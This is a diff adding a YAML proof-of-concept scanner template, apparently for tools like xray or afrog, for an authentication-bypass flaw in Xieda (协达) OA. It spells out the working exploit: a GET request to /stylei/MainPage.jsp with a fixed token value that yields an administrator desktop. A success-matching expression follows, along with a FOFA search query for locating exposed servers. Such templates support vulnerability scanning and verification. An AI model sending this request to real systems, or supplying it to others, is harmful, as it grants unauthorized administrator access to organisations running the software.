@@ -1,0 +1,15 @@
+id: poc-yaml-xieda-mainpage-jsp-bypass-authentication-login
+info:
+  name: 协达OA MainPage.jsp 绕过验证登陆漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 协达OA
+  fofa: body="/interface/CheckLoginName.jsp"
+requests:
+- method: GET
+  path: /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN
+  expression: status_code == 200 && contains(body,"管理员") && contains(body,"桌面") &&
+    contains(body,"var token=\"YXR-YMD-SYQ-TOKEN\"") && !contains(body,"重新登录")
+variables: {}
+transport: http
